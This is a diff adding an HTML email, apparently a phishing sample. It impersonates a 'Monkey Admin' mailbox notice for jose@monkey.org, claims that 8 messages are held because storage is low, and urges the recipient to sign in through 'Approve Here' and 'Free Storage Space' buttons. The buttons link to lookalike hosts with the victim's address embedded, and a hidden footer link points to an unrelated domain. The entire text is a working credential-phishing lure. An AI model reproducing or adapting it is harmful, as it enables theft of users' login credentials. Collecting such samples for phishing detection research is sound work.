@@ -1,0 +1,111 @@
+
+<!doctype html>
+<html>
+  <head>
+  <style>
+body {
+    background-color:#FFFFFF;
+	font-size:16px;
+	font-family:monospace;
+	margin:0;
+    padding:0;
+	text-align: center;
+    -ms-text-size-adjust: 100%;
+    -webkit-text-size-adjust: 100%;
+}
+img {
+  max-width: 90%;
+  max-height: 90%;
+  position: absolute;
+  align:middle;
+  left: 0;
+  right: 0;
+  margin: auto;
+ 
+}
+span, h2{
+	text-align: center;
+}
+table {
+		border: none;
+        border-collapse: separate;
+        width: 100%; }
+        table td {
+          font-family: monospace;
+          font-size: 14px;
+          vertical-align: top; }
+		  
+	  /* -------------------------------------
+          RESPONSIVE AND MOBILE FRIENDLY STYLES
+      ------------------------------------- */
+		  
+		  @media only screen and (max-width: 620px) {
+        table[class=body] h1 {
+          font-size: 28px !important;
+          margin-bottom: 10px !important; }
+        table[class=body] p,
+        table[class=body] ul,
+        table[class=body] ol,
+        table[class=body] td,
+        table[class=body] span,
+        table[class=body] a {
+          font-size: 16px !important; }
+        table[class=body] .wrapper,
+        table[class=body] .article {
+          padding: 10px !important; }
+        table[class=body] .content {
+          padding: 0 !important; }
+        table[class=body] .container {
+          padding: 0 !important;
+          width: 100% !important; }
+        table[class=body] .main {
+          border-left-width: 0 !important;
+          border-radius: 0 !important;
+          border-right-width: 0 !important; }
+        table[class=body] .btn table {
+          width: 100% !important; }
+        table[class=body] .btn a {
+          width: 100% !important; }
+        table[class=body] .img-responsive {
+          height: auto !important;
+          max-width: 100% !important;
+          width: auto !important; }}
+		  
+</style>
+   <meta name='viewport' content='width=device-width' />
+    <meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+  </head>
+  <body>
+  <table>
+  <tr>
+  <td>
+  <br>
+  <span>
+  <div style='background-color:#f3fff8;border-left-style:solid;border-radius:5px;border-left-width:6px;border-color:#029740;height:auto;padding:5px;text-align:left;width:90%;padding-left:3%;'>This email was generated automatically from monkey.org</div>
+</span>
+<br>
+<div>
+</div><br><br><br><br><br><span>
+<h2 style='color:#2153d3;text-decoration:underline;'>Monkey  failure delivery  Notice  on 1st of October 2023   </h2><br>
+</span>
+<span>8 New mails failed to deliver to <span style='font-weight:bold;'>jose@monkey.org</span> box, due to low storage capacity</span><br><br>
+<span>An approval is needed from you to move these messages and free up memory space</span><br><br>
+<span>Please sign-in from Monkey Organization portal to release messages to the inbox folder and free up space </span><br><br>
+<span><a style='color:#fff; font-size:15px; padding:5px; background-color:#2153d3; border-radius:2px;line-height:35px; text-decoration:none;' href='http://Jose-51094.website.com#jose@monkey.org' target='_blank' >Approve Here</a></span>
+<span><a style='color:#fff; font-size:15px; padding:5px; background-color:#2153d3; border-radius:2px;line-height:35px; text-decoration:none;' href='http://51094-Jose.website.com#jose@monkey.org' target='_blank' >Free Storage Space</a></span>
+<br><br>
+<span style='color:red;'>Deliveries will remain pending until you take the required action</span>
+<br><br><br>
+<Span>Kind Regards,</span><br><br>
+<Span>Monkey Admin.</span><br><br><br>
+<hr style='color:#2153d3;'>
+
+
+<div style='font-size:11px'> monkey.org &copy 2023 |  <a href='http://taiyouhousing.com/#jose@monkey.org' style='color:#555555;text-decoration:none' target='_blank'></a>  <a href='#' style='color:#555555;text-decoration:none' target='_blank'>Terms of Use</a> | <a href='#' style='color:#555555;text-decoration:none' target='_blank'>Security and Privacy</a></div><div class='yj6qo'></div><div class='adL'>   </div></div><div class='adL'>
+  </div></div><div class='adL'>  
+</div></div>
+
+</td></tr></table>
+  </body>
+  </html>
+	
